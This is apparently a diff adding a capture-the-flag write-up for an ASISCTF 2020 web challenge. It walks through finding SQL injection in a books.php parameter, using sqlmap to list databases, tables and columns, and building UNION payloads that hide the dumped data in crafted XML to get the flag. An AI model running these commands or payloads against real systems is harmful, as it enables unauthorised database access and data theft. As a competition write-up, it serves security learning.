@@ -1,1 +1,149 @@
-This is a challenge from ASISCTF 2020
+This is a challenge from ASISCTF 2020 
+
+
+We have the JavaScript code look like this:
+
+              import {Spinner} from './spin.js';
+              async function anexcerpt(book) {
+                const modalEl = document.createElement('div');
+                modalEl.style.width = '70%';
+                modalEl.style.height = '50%';
+                modalEl.style.margin = '100px auto';
+                modalEl.style.backgroundColor = '#fff';
+                modalEl.className = 'mui-panel';
+                const header = document.createElement('h2');
+                header.appendChild(document.createTextNode("An Excerpt From " + book.name));
+                modalEl.appendChild(header);
+                const loading = createSpinner(modalEl);
+                // show modal
+                mui.overlay('on', modalEl);
+
+                const response = await fetch('books.php?type=excerpt&id=' + book.id);
+                const bookExcerpt = await response.text();
+                const txtHolder = document.createElement('div');
+                txtHolder.className = 'mui-textfield mui--z2'
+                const txt = document.createElement('textarea');
+                txt.appendChild(document.createTextNode(bookExcerpt));
+                txt.readOnly = true;
+                txt.style.height = "100%";
+                txtHolder.appendChild(txt);
+                txtHolder.style.height = "70%";
+                loading.stop();
+                modalEl.appendChild(txtHolder);
+              }
+
+              function readonline(book) {
+                window.open(book.link);
+              }
+
+              function createActionButton(cls, title, txt, callback) {
+                const btn = document.createElement('button');
+                btn.className = 'mui-btn mui-btn--fab ' + cls;
+                btn.title = title;
+                btn.appendChild(document.createTextNode(txt));
+                btn.addEventListener('click', callback);
+                return btn;
+              }
+
+              const spinner = createSpinner(document.getElementById("msg"));
+              window.addEventListener('load', loadBooksList);
+
+              async function loadBooksList() {
+                const response = await fetch('books.php?type=list');
+                const books = await response.json();
+                const tbody = document.getElementById("books");
+                for (const book of books) {
+                  const tr = document.createElement('tr');
+                  for (const key of ['name', 'author', 'year']) {
+                    const td = document.createElement('td');
+                    td.appendChild(document.createTextNode(book[key]));
+                    tr.appendChild(td);
+                  }
+                  const td = document.createElement('td');
+                  td.appendChild(createActionButton('mui-btn--primary', 'an excerpt', 'ae', function () {
+                    anexcerpt(book);
+                  }));
+                  td.appendChild(createActionButton('mui-btn--accent', 'read online', 'ro', function () {
+                    readonline(book);
+                  }));
+                  tr.appendChild(td);
+                  tbody.appendChild(tr);
+                }
+                spinner.stop();
+                document.getElementById("msg").style = 'display: none;';
+              }
+
+
+In which they sending request to books.php to handle in which this GET request seem important (books.php?type=excerpt&id=' + book.id)
+First thing first, FUZZING both parameters, the type just did not get any result while the id return simplexml_load_string() error and some thing result with the sql injection fuzz
+
+So, The type parameters was just use to `control` and the id parameter will be the one that vulnerable to SQL.
+
+Knowing that, now we need to finger out how the get the database name, tables, columns. The result is limited if not careful we will get 429. So with sqlmap, but --dump must be limited
+
+Using this to get the name of the databases:
+sqlmap -u "https://poems.asisctf.com/books.php?type=excerpt&id=1" -p "id" --dbs 
+
+available databases [2]:                                                                     
+[*] ASISCTF
+[*] information_schema
+
+
+This to get the name of the tables:
+sqlmap -u "https://poems.asisctf.com/books.php?type=excerpt&id=1" -p "id" -D ASISCTF --tables
+
+Database: ASISCTF
+[1 table]
++-------+
+| books |
++-------+
+
+
+And this to get the columns 
+sqlmap -u "https://poems.asisctf.com/books.php?type=excerpt&id=1" -p "id" -D ASISCTF -T books --columns
+
+Database: ASISCTF                                                                            
+Table: books
+[2 columns]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| id     | int(11) |
+| info   | text    |
++--------+---------+
+
+Now using dump with threads 1 
+sqlmap -u "https://poems.asisctf.com/books.php?type=excerpt&id=1" -p "id" --threads=1 --dump
+The result is something like this:
+<?xml version="1.0" encoding="UTF-8"?>\n<book>\n  <id>1</id>\n  <name>Dīvān of Hafez</name>\n
+In which it took too long to retrieved information
+
+So the info would containing something like this:
+
+<?xml version="1.0" encoding="UTF-8"?>
+  <book>
+      <id>1</id>
+      <name></name>
+      <flag>asdf</flag>
+      <excerpt>Joseph will</excerpt>
+      <...>...</...>
+  </book>
+  
+And the books.php with parameter type=excerpt using simplexml_load_string() will only take the <excerpt> tag from the XML in database (info). 
+Understand the structure I started with the basics:
+-1' UNION SELECT info FROM books WHERE id=2 -- - //return info of book 2
+
+Removing the info part by sql syntax:
+-1' UNION SELECT CONCAT('<!--',info,'-->' )FROM books WHERE id=2 -- -
+
+Created new xml:
+-1' UNION SELECT CONCAT( '<?xml version="1.0" encoding="UTF-8"?><book><excerpt>trying</excerpt></book><!--',info,'-->') FROM books WHERE id=2 -- -
+
+And finish by added the data from database into <excerpt>
+-1' UNION SELECT CONCAT( '<?xml version="1.0" encoding="UTF-8"?><book><excerpt>x',(REPLACE (SUBSTRING(info, 1,257), "<", "x"%20 )),'</excerpt></book><!--',info,'-->') FROM books WHERE id=2 -- -
+
+
+Whoa la, magic happend 
+ASIS{6e73c9d277cc0776ede0cbd36eb93960d0b07884}
+  
+
